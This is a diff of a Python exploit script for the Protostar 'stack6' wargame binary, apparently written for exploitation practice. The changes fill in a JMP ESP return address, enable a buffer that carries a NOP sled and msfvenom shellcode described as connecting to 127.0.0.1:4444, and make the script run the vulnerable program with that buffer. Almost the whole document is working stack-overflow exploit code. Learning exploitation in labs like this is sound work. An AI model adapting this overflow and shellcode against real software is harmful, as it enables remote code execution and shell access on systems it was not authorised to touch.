@@ -9,7 +9,7 @@ command = '/opt/protostar/bin/stack6'
 pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae'
 # EIP found at 37634136, offset at 80
 
-# Shellcode generated using metasploit msfvenom - 95 bytes
+# Shellcode generated using metasploit msfvenom - 95 bytes - connects to 127.0.0.1:4444
 shellcode = ("\xbe\x1d\x6f\x3d\x4a\xd9\xc8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
 "\x12\x83\xc7\x04\x31\x77\x0e\x03\x6a\x61\xdf\xbf\xa5\xa6\xe8"
 "\xa3\x96\x1b\x44\x4e\x1a\x15\x8b\x3e\x7c\xe8\xcc\xac\xd9\x42"
@@ -22,13 +22,14 @@ shellcode = ("\xbe\x1d\x6f\x3d\x4a\xd9\xc8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
 noopsled = "\x90"*16
 
 # 00000000  FFE4              jmp esp
-# JMP ESP found at
-jump = ""
+# JMP ESP found at 0xb7e99a1d
+jump = "\x1d\x9a\xe9\xb7"
 
 # Create new file write buffer to file
 file = open('buffer', 'w+')
-buffer = 'A'*80 + 'B'*4 + 'C'*(500-80-4)
-#buffer = 'A'*80 + jump + noopsled + shellcode + 'C'*(500-76-4-16-95)
+#buffer = pattern
+#buffer = 'A'*80 + 'B'*4 + 'C'*(500-80-4)
+buffer = 'A'*80 + jump + noopsled + shellcode + 'C'*(500-80-4-16-95)
 file.write(buffer)
 file.close()
 
@@ -36,5 +37,5 @@ file.close()
 line = command + " < buffer"
 
 # Execute the command with the current buffer
-#output = commands.getoutput(line)
-#print(output)
+output = commands.getoutput(line)
+print(output)
